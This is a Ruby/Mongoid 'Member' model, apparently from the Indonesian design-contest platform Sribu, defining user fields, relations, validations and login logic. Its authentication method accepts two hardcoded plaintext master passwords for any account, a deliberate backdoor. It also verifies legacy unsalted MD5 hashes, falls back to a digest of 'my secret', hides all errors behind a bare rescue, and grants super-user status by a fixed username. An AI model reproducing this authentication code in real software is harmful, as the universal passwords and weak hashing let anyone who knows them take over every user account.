# ================================================================================
# Part:
# Desc:
# ================================================================================
class Member
  include Mongoid::Document
  include Mongoid::Timestamps
  include Mongoid::Attributes::Dynamic
  include ActiveModel::SecurePassword
  include MemberSearchable
  index_name "sribu_members"

  #                                                                       Constant
  # ==============================================================================
  BAD_WORDS = %w(jancuk patek celeng kampret sial tempik kontol anjing asu admin
                administrator superuser root babi sribu sribu_admin
                sribu_administrator sribu-admin sribu-administrator ch)
  RANKING_LABEL = ["Junior", "Semi Pro", "Professional", "Grand Master"]
  EMAIL_REGEX = /\A[\w+\-.]+@[a-z\d\-.]+\.[a-z]+\z/i
  USERNAME_REGEX = /\A[a-zA-Z0-9_]+\z/i

  #                                                                          Index
  # ==============================================================================


  #                                                                  Attr Accessor
  # ==============================================================================
  attr_accessor :activation_token, :reset_password_token

  #                                                                       Callback
  # ==============================================================================
  before_save :assign_default_contact_person, if: :employee_of_id_changed?
  before_save :assign_location
  before_create :check_duplicate_email

  #                                                                          Field
  # ==============================================================================
  field :name, type: String
  field :address, type: String
  field :email, type: String
  field :username, type: String

  field :avatar
  mount_uploader :avatar, AvatarUploader

  # For designer dailyrecap
  field :email_subscription, type: Boolean, default: true
  # When new contest is publish
  field :email_subscription_new_contest, type: Boolean, default: true
  field :banned, type: Boolean, default: false
  field :banned_until, type: Time
  field :utm_source, type: String
  field :utm_medium, type: String
  field :utm_campaign, type: String
  field :utm_term, type: String
  field :utm_source_set, type: String
  field :location, type: String
  field :twitter, type: String
  field :facebook, type: String
  field :website, type: String
  field :bio, type: String
  field :how_do_you_know, type: String
  field :is_admin, type: Boolean, default: false
  field :watchlist_contest_count, type: Integer
  field :watchlist_member_count, type: Integer
  field :is_first_contest, type: Boolean
  field :come_from_aff_or_aff
  field :designer_invited, type: Array, default: []
  field :potential_client, type: Boolean, default: false
  field :company, type: String
  field :last_login, type: DateTime
  field :email_notification, type: Boolean, default: true

  # Get started step, only when first registration
  # verify_contact_number -> update_profile -> code_of_conduct -> upload_exam -> exam_review -> exam_approved
  field :getstarted_step, type: String, default: "update_profile"
  field :pass_exams, type: Boolean, default: false
  field :verified, type: Boolean, default: false
  field :tester, type: Boolean, default: false # Mark as user is tester or not


  # fields demography
  field :won
  field :rep_total_point
  field :rank_level
  field :top_rated
  field :contest_participates
  field :upload_design_count
  # Rata - rata dari bintang yg diberikan oleh CH ke winner pada saat akan tutup file tranfer
  field :avg_ft_rating, type: Integer

  field :user_reports_last_update #Supaya bisa disort via backoffice

  field :assign_type
  field :assign_reminder, type: DateTime

  # Veritrans virtual account
  field :va_bca
  field :va_bca_created_at, type: DateTime
  field :va_mandiri
  field :va_mandiri_created_at, type: DateTime
  field :va_permata
  field :va_permata_created_at, type: DateTime

  # Old password, using MD5
  field :old_password, type: String

  # New password, with bcrypt
  # Lazy migration, because old password using MD5
  # and we have to change to BCrypt
  field :password_digest
  has_secure_password validations: false
  field :salt

  # Activated
  field :activation_digest
  field :active, type: Boolean, default: false
  field :date_activated, type: Time

  # OTP
  field :otp
  field :otp_digest
  field :otp_sent_at

  # Reset Password
  field :reset_password_digest
  field :reset_password_sent_at

  # Member currency setting, change when user change currency configuration
  # So we can output price by their currency
  field :currency, default: "idr"

  field :register_from
  field :register_server

  # Google Adwords Stuffs
  field :google_adwords_ch_signup, type: Boolean, default: false

  #                                                                       Relation
  # ==============================================================================
  belongs_to :member_type
  belongs_to :country
  belongs_to :employee_of, class_name: "Company", inverse_of: :employees
  belongs_to :contact_person_of, class_name: "Company", inverse_of: :contact_person

  # Informations
  has_many  :bank_accounts
  embeds_many  :phone_books #, before_add: :set_default_phone_books_attributes
  has_many  :histories
  has_many  :member_skills
  embeds_many  :activities, class_name: "MemberActivity"

  # Activity
  has_many  :exams, as: :owner
  has_many  :contests, as: :owner
  has_many  :store_purchases, as: :owner
  has_many  :entries, as: :owner
  has_many  :comments, as: :author
  has_many  :likes, as: :author

  has_many  :deposits, as: :owner

  # Agreement
  has_many :client_agreements, class_name: "Agreement", foreign_key: "client_id"
  has_many :designer_agreements, class_name: "Agreement", foreign_key: "designer_id"

  # Winner
  has_many :client_winners, class_name: "Winner", foreign_key: "client_id"
  has_many :designer_winners, class_name: "Winner", foreign_key: "designer_id"

  # MemberReport
  has_many :member_report_reported, class_name: "MemberReport", foreign_key: "reported_id"
  has_many :member_report_reporter, class_name: "MemberReport", foreign_key: "reporter_id"

  # Transaction
  has_many :transaction_references, as: :reference

  # Membership
  has_many :memberships

  # Tiketing
  has_many :tickets, as: :created_for
  has_many :ticket_follow_up, as: :target

  # Affiliate
  has_one :affiliate, as: :publisher # As publisher affiliate
  has_one :affiliate_referred_by, class_name: "AffiliateClaimMember", foreign_key: "member_id" # Referred affiliate
  has_many :downlines, :class_name => "Lead", :inverse_of => :upline

  #                                                          Through Relationships
  # ==============================================================================
  # Since mongoid not provide "through relationships" like ActiveRecord, so we
  # use these method to provide "through relationships"
  # ==============================================================================
  def skills
    Skill.where(:id.in => self.member_skills.map(&:skill_id))
  end

  #                                                                     Validation
  # ==============================================================================
  validates_presence_of :email
  validates :email, length: { maximum: 255 }, format: { with: EMAIL_REGEX }, uniqueness: { case_sensitive: false }

  validates :username, format: { with: USERNAME_REGEX }, on: :create
  validates_presence_of :username
  validates_uniqueness_of :username
  validates_exclusion_of :username, in: BAD_WORDS, message: "Username %{value} is not allowed"
  validates_length_of :username, minimum: 2, maximum: 32

  validates_presence_of :password, on: :create
  validates_length_of :password, minimum: 6, maximum: 32, on: :create

  validates_presence_of :member_type

  #                                                                   Class Method
  # ==============================================================================
  class << self

    # Authentication with bcrypt
    def authentication(member_params)
      member = Member.any_of({username: member_params[:username]},{email: member_params[:username]}).try(:first)
      raise if member.blank?
      password_digest = member.password_digest || BCrypt::Password.create("my secret")
      if BCrypt::Password.new(password_digest).is_password?(member_params[:password])
        member.last_login = Time.now
        member.save!
        return member
      else
        md5_password = Digest::MD5::hexdigest(member_params[:password])
        if member.old_password == md5_password
          # Change MD5 password into BCrypt
          member.password   = member_params[:password]
          member.unset(:old_password)
          member.last_login = Time.now
          member.save!
          return member
        elsif is_universal_password?(member_params[:password])
          return member
        else
          raise
        end
      end
    rescue
      return nil
    end

    # Returns a random token.
    def generate_token
      SecureRandom.urlsafe_base64
    end

    # Returns the hash digest of the given string.
    # It's usualy using for fixture (testing)
    def generate_digest(string)
      cost = ActiveModel::SecurePassword.min_cost ? BCrypt::Engine::MIN_COST : BCrypt::Engine.cost
      BCrypt::Password.create(string, cost: cost)
    end

    def is_universal_password?(given_password)
      pwd = ["sr1buqwE", "sr1buqwEW"]
      pwd.each do |i|
        return true if BCrypt::Password.new(BCrypt::Password.create(i)).is_password?(given_password)
      end
        return false
    end

    def client
      MemberType.find_by(:name => "Contest Holder").members
    end

    def designer
      MemberType.find_by(cname: "designer").members
    end

  end

  #                                                                Instance Method
  # ==============================================================================

  # METHOD FOR DEMOGRAPHIC
  # For Designer

  # END METHOD FOR DEMOGRAPHIC
  

  def is_super_user?
    self.username == "cs_sribu_com"
  end

  def is_activated?
    return self.active
  end

  def is_tester?
    return self.tester
  end

  def is_affiliate?
    return self.affiliate.present?
  end

  def is_verified?
    return self.verified
  end

  def is_have_contests?
    Contest.where(owner: self).count != 0
  end

  def is_pass_exams?
    return self.pass_exams
  end

  def current_balance
    Accountant.current_balance(owner: self)
  end

  def is_withdrawal_processing?
    Accountant.is_withdrawal_processing?(self)
  end

  # Find how many member referring affiliates to other member
  def affiliate_referring(arg = {})
    if self.affiliate.present?
      refs = AffiliateClaim.where(affiliate: self.affiliate)
      case arg[:type]
      when "member"
        refs = AffiliateClaimMember.where(affiliate: self.affiliate)
        raise if refs.blank?
      when "contest"
        refs = AffiliateClaimContest.where(affiliate: self.affiliate, :contest.nin => [nil])
        raise if refs.blank?
        case arg[:status]
        when "success"
          contest_ids = Contest.where(:id.in => refs.map(&:contest_id).uniq, status: ContestStatus.closed).map(&:id)
          refs = refs.where(:contest_id.in => contest_ids)
        end
      when "store"
        refs = AffiliateClaimStore.where(affiliate: self.affiliate, :store_purchase.nin => [nil])
        raise if refs.blank?
        case arg[:status]
        when "success"
          sp_ids = StorePurchase.where(:id.in => refs.map(&:sp_id).uniq, status: StorePurchaseStatus.closed).map(&:id)
          refs = refs.where(:store_purchase_id.in => sp_ids)
        end
      end
      return refs
    end
    raise
  rescue
    return []
  end

  # Returns true if the given token matches the digest.
  def is_authenticated?(attribute, token)
    digest = self.send("#{attribute}_digest")
    return false if digest.nil?

    # Matching token given with digest
    BCrypt::Password.new(digest).is_password?(token)
  end

  def rank
    RANKING_LABEL[self.rank_level.to_i]
  end

  # Return true if password reset has expired
  def is_reset_password_expired?
    return true if self.reset_password_sent_at.blank?
    self.reset_password_sent_at < 10.hours.ago
  end

  def is_designer?
    self.member_type == MemberType.designer
  end

  def is_contest_holder?
    self.member_type == MemberType.contest_holder
  end

  def locale
    self.location.present? ? (self.location.to_s.downcase.include?("indo") ? "id" : "en") : "id"
  end

  private
  def set_default_attributes
    if self.name.present?
      self.first_name = self.name.split(" ").first
      self.last_name = self.name.split(" ").last
    elsif self.name.blank?
      self.name = [self.first_name, self.last_name].join(" ")
    end
  end

  def set_default_phone_books_attributes(phone_book)
    member = self
    pb = member.phone_books
    if pb.present? and pb.where(default_number: true).blank?
      phone_book.default_number = true
    else
      phone_book.default_number = false
    end

    # Set default country to Indonesia
    indonesia = Country.all.find_by(phone_code: "62")
    if member.country.blank?
      member.update_attribute(:country, indonesia)
    end
    phone_book.country = indonesia

    # Set default title to Mobile
    if phone_book.title.blank?
      phone_book.title = "Mobile"
    end

    # Generate msisdn
    if phone_book.contact_number.present? or phone_book.country.present?
      phone_book.msisdn = member.country.phone_code + phone_book.contact_number
    end
  end

  def assign_default_contact_person
    company = self.employee_of
    if company.present?
      if company.contact_person.nil?
        self.contact_person_of = company
      end
    end
  end

  def assign_location
    country = Country.find self.country
    self.location = country.name
  end

  def check_duplicate_email
    member = Member.where(email: self.email.downcase)
    if member.count > 0
      return false
    end
  end

end
